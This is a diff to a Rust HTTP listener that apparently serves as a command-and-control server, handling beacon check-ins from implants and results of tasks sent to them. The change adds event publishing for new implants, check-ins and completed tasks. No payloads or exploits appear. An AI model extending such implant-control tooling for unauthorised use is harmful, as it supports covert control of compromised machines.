@@ -1,4 +1,5 @@
 use crate::config::ListenerConfig;
+use crate::core::events::Event;
 use crate::protocol::{crypto, wire};
 use crate::state::AppState;
 use axum::{
@@ -69,6 +70,7 @@ async fn handle_beacon(
     };
 
     let addr_str = "";
+    let agent_hex = hex::encode(checkin.agent_id);
     match state.app.implants.handle_checkin(
         &checkin.agent_id,
         &checkin.hostname,
@@ -78,10 +80,15 @@ async fn handle_beacon(
     ) {
         Ok(is_new) => {
             if is_new {
-                info!(
-                    "new implant: {} ({})",
-                    hex::encode(checkin.agent_id),
-                    checkin.hostname
+                info!("new implant: {} ({})", agent_hex, checkin.hostname);
+                state.app.events.publish(
+                    Event::new("implant_new", &format!("{} ({})", agent_hex, checkin.hostname))
+                        .with_agent(&agent_hex),
+                );
+            } else {
+                state.app.events.publish(
+                    Event::new("implant_checkin", &checkin.hostname)
+                        .with_agent(&agent_hex),
                 );
             }
         }
@@ -123,6 +130,7 @@ async fn handle_result(
         }
     };
 
+    let agent_hex = hex::encode(result.agent_id);
     match state.app.tasks.complete(
         result.task_id as i64,
         result.success,
@@ -132,6 +140,14 @@ async fn handle_result(
             info!(
                 "task {} completed (success={})",
                 result.task_id, result.success
+            );
+            state.app.events.publish(
+                Event::new(
+                    "task_complete",
+                    &format!("success={}", result.success),
+                )
+                .with_agent(&agent_hex)
+                .with_task(result.task_id as i64),
             );
         }
         Ok(false) => {
